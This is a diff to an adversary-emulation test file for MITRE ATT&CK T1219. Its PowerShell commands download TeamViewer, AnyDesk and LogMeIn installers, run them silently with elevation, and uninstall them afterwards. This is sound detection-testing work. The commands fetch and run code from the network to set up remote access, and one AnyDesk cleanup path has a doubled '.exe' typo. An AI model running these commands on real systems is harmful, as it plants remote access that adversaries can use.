@@ -1,43 +1,56 @@
----
 attack_technique: T1219
-display_name: Remote Access Tools
-
+display_name: Remote Access Software
 atomic_tests:
 - name: TeamViewer Files Detected Test on Windows
   auto_generated_guid: 8ca3b96d-8983-4a7f-b125-fc98cc0a2aa0
   description: |
     An adversary may attempt to trick the user into downloading teamviewer and using this to maintain access to the machine. Download of TeamViewer installer will be at the destination location when sucessfully executed.
   supported_platforms:
-    - windows
+  - windows
   executor:
-    name: powershell
-    elevation_required: true
     command: |
       Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe
-      C:\Users\$env:username\Desktop\TeamViewer_Setup.exe
-
+      $file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe"
+      Start-Process $file1 /S;
+      Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'
+    cleanup_command: |-
+      Start-Process 'C:\Program Files (x86)\TeamViewer\uninstall.exe' "/S"
+      $file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe"
+      Remove-Item $file1
+    name: powershell
+    elevation_required: true
 - name: AnyDesk Files Detected Test on Windows
   auto_generated_guid: 6b8b7391-5c0a-4f8c-baee-78d8ce0ce330
   description: |
     An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed.
   supported_platforms:
-    - windows
+  - windows
   executor:
-    name: powershell
-    elevation_required: true
     command: |
       Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe
-      C:\Users\$env:username\Desktop\AnyDesk.exe
-
+      $file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe"
+      Start-Process $file1 /S;
+    cleanup_command: |-
+      $file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe.exe"
+      Remove-Item $file1
+    name: powershell
+    elevation_required: true
 - name: LogMeIn Files Detected Test on Windows
   auto_generated_guid: d03683ec-aae0-42f9-9b4c-534780e0f8e1
   description: |
     An adversary may attempt to trick the user into downloading LogMeIn and use to establish C2. Download of LogMeIn installer will be at the destination location and ran when sucessfully executed.
   supported_platforms:
-    - windows
+  - windows
   executor:
-    name: powershell
-    elevation_required: true
     command: |
       Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi
-      C:\Users\$env:username\Desktop\LogMeInIgnition.msi
+      $file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi"
+      Start-Process $file1 /S;
+      Start-Process 'C:\Program Files (x86)\LogMeInIgnition\LMIIgnition.exe' "/S"
+    cleanup_command: |-
+      get-package *'LogMeIn Client'* | uninstall-package
+      $file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi"
+      Remove-Item $file1
+    name: powershell
+    elevation_required: true
+
